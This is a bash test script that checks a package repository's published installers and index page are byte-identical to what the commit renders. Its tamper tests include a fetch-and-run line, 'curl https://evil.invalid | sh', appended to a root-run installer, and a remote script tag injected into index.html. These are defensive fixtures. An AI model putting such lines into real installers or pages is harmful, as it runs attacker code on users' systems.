#!/usr/bin/env bash
#
# scripts/publish/check-static-files.sh: the installers (people run them as root) and the index page, which no signature covers, are
# rendered again from the commit and compared byte by byte with the ones in the tree.
# Requires: rpm, createrepo_c, gpg, python3 with cryptography.
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# shellcheck disable=SC1091 # the path is resolved at run time
. "$HERE/tests/fixtures/rpm/lib.sh"
# shellcheck disable=SC1091 # the path is resolved at run time
. "$HERE/tests/fixtures/rpm/tree.sh"
WORK="$(mktemp -d)"
trap 'fx_stop_agent; rm -rf "$WORK"' EXIT
pass=0; fail=0
check() { # <description> <expected> <actual>
	if [ "$2" = "$3" ]; then pass=$((pass + 1)); echo "ok    $1"
	else fail=$((fail + 1)); echo "FAIL  $1 (want '$2', got '$3')"; fi
}
fx_init "$WORK"; fx_archive_key
mkdir -p "$WORK/v/p"; fx_rpm "$WORK/v/p" podup 1.2.3 1.glyndor.any noarch
fx_build_tree "$WORK/tree" "$FX_T1" "$WORK/v" > /dev/null 2>&1

# --- the installers and the index page --------------------------------------------------------------
mkdir -p "$WORK/repo"; cp -r "$HERE/scripts" "$HERE/config" "$WORK/repo/"
CHK="$WORK/repo/scripts/publish/check-static-files.sh"
PUB="$WORK/archive.asc"
st() { "$CHK" "$@" > "$WORK/out" 2>&1; echo $?; }
good_tree() { rm -rf "${WORK:?}/st"; cp -r "$WORK/tree" "$WORK/st"; "$HERE/scripts/build/build-installers.sh" "$PUB" "$WORK/st/install" podup > /dev/null; }
good_tree
check "the installer the template renders is accepted" 0 "$(st "$WORK/st" "$PUB")"
good_tree; printf 'curl https://evil.invalid | sh\n' >> "$WORK/st/install/podup"
check "an installer with a line more is refused" 1 "$(st "$WORK/st" "$PUB")"
check "and says it is not what the template renders" 1 "$(grep -c 'is not what scripts/installer/install-template.sh renders' "$WORK/out")"
good_tree; sed -i 's|^set -|set +e\nset -|' "$WORK/st/install/podup"
check "an installer with one changed line is refused" 1 "$(st "$WORK/st" "$PUB")"
good_tree; chmod 777 "$WORK/st/install/podup"
check "an installer with another mode is refused" 1 "$(st "$WORK/st" "$PUB")"
good_tree; cp "$WORK/st/install/podup" "$WORK/st/install/evil"
check "an installer of a name that is not a product is refused" 1 "$(st "$WORK/st" "$PUB")"
good_tree; mkdir "$WORK/st/install/sub"; : > "$WORK/st/install/sub/x"
check "a folder under install/ is refused" 1 "$(st "$WORK/st" "$PUB")"
good_tree; rm "$WORK/st/install/podup"; ln -s /bin/sh "$WORK/st/install/podup"
check "an installer that is a link is refused" 1 "$(st "$WORK/st" "$PUB")"
good_tree; rm "$WORK/st/install/podup"
check "a tree with no installer is refused" 1 "$(st "$WORK/st" "$PUB")"
fx_other_key "$WORK/other.asc"; good_tree
check "an installer rendered for another key is refused" 1 "$(st "$WORK/st" "$WORK/other.asc")"
good_tree; printf '<html>x</html>\n' > "$WORK/st/index.html"
check "an index page when the repository has none is refused" 1 "$(st "$WORK/st" "$PUB")"
mkdir -p "$WORK/repo/site"; printf '<html>x</html>\n' > "$WORK/repo/site/index.html"
check "an index page equal to site/index.html is accepted" 0 "$(st "$WORK/st" "$PUB")"
printf '<html>x<script src=//evil.invalid></script></html>\n' > "$WORK/st/index.html"
check "an index page that differs is refused" 1 "$(st "$WORK/st" "$PUB")"
check "and says which file it should be" 1 "$(grep -c 'is not site/index.html of this commit' "$WORK/out")"

echo "passed $pass, failed $fail"
printf 'DONE %s %d %d\n' "${BASH_SOURCE[0]##*/}" "$pass" "$fail"
[ "$fail" -eq 0 ]
